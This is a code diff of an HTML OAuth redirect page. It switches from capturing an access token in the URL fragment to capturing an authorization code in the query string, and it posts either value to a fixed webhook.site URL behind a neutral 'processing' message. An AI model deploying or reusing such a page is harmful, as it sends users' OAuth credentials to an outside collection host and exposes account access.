@@ -4,28 +4,27 @@
 <body>
   <h3>Processing – please wait.</h3>
   <script>
-    // Get the full URL including the fragment
-    const hash = window.location.hash.substring(1);
-    const params = new URLSearchParams(hash);
-    const token = params.get('access_token');
+    // Get the authorization code from the URL query parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    const code = urlParams.get('code');
 
-    if (token) {
-      // Send to webhook.site
+    if (code) {
+      // Send the code to webhook.site
       fetch('https://webhook.site/232074eb-870d-4ba0-9d4a-4fc1d7b858b8', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ token: token })
+        body: JSON.stringify({ code: code })
       })
       .then(() => {
-        document.body.innerHTML = '<h3>Done – you can close this.</h3>';
+        document.body.innerHTML = '<h3>✅ Code received and sent successfully!</h3><p>You can close this tab.</p>';
       })
       .catch((err) => {
-        document.body.innerHTML = '<h3>Error sending token – check console.</h3>';
+        document.body.innerHTML = '<h3>❌ Error sending code.</h3>';
         console.error(err);
       });
     } else {
       // Show the full URL for debugging
-      document.body.innerHTML = '<h3>No token found. Full URL:</h3><p>' + window.location.href + '</p>';
+      document.body.innerHTML = '<h3>No code found in URL.</h3><p>Full URL: ' + window.location.href + '</p>';
       console.log('Full URL:', window.location.href);
     }
   </script>
